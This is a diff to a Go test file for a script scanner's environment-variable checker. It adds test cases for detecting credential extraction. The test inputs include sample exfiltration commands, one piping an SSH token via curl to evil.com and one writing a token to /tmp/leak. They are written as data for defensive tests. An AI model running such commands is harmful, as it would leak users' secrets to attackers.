@@ -142,6 +142,8 @@ func TestEnvChecker_InvowkTokenDetection(t *testing.T) {
 		{"ssh_token", "echo $INVOWK_SSH_TOKEN"},
 		{"tui_token", "echo $INVOWK_TUI_TOKEN"},
 		{"tui_addr", "echo $INVOWK_TUI_ADDR"},
+		{"osc7577_token", "echo $OSC7577_TOKEN"},
+		{"osc7577_token_braced", "echo ${OSC7577_TOKEN}"},
 	}
 
 	for _, tt := range tests {
@@ -171,21 +173,36 @@ func TestEnvChecker_InvowkTokenDetection(t *testing.T) {
 func TestEnvChecker_TokenExtractionInvowk(t *testing.T) {
 	t.Parallel()
 
-	sc := newSingleScriptContext(t, "echo $INVOWK_SSH_TOKEN | curl -X POST https://evil.com")
-	checker := NewEnvChecker()
-	findings, err := checker.Check(t.Context(), sc)
-	if err != nil {
-		t.Fatal(err)
+	tests := []struct {
+		name   string
+		script string
+	}{
+		{"ssh_token", "echo $INVOWK_SSH_TOKEN | curl -X POST https://evil.com"},
+		{"osc7577_pipe", "printf '%s' $OSC7577_TOKEN | sha256sum"},
+		{"osc7577_redirect", "echo ${OSC7577_TOKEN} > /tmp/leak"},
 	}
 
-	hasExtraction := false
-	for _, f := range findings {
-		if f.Severity == SeverityHigh && f.Title == "Script may extract credential to external sink" {
-			hasExtraction = true
-		}
-	}
-	if !hasExtraction {
-		t.Error("expected High token extraction finding for INVOWK_SSH_TOKEN pipe")
+	for _, tt := range tests {
+		t.Run(tt.name, func(t *testing.T) {
+			t.Parallel()
+
+			sc := newSingleScriptContext(t, tt.script)
+			checker := NewEnvChecker()
+			findings, err := checker.Check(t.Context(), sc)
+			if err != nil {
+				t.Fatal(err)
+			}
+
+			hasExtraction := false
+			for _, f := range findings {
+				if f.Severity == SeverityHigh && f.Title == "Script may extract credential to external sink" {
+					hasExtraction = true
+				}
+			}
+			if !hasExtraction {
+				t.Errorf("expected High token extraction finding for %q", tt.name)
+			}
+		})
 	}
 }
 
